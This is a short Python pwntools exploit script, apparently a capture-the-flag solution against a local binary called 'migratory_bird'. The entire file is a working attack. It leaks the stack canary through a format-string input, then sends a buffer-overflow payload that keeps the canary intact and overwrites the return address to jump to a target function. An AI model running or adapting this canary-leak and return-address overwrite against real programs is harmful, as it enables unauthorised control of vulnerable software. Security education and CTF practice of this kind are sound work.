from pwn import *
import re



# p = process("./migratory_bird")
el = ELF("./migratory_bird")
p = remote("127.0.0.1", 10001)
p.sendline(b"%13$p")

response = p.recv().decode()
print(response)
canary = re.search(r"0x[0-9a-f]{16}", response)[0]


payload = 40 * b'A' + p64(int(canary, 16)) + 8 * b'B' + p64(el.symbols["south_africa"]) 

p.sendline(payload)
p.interactive()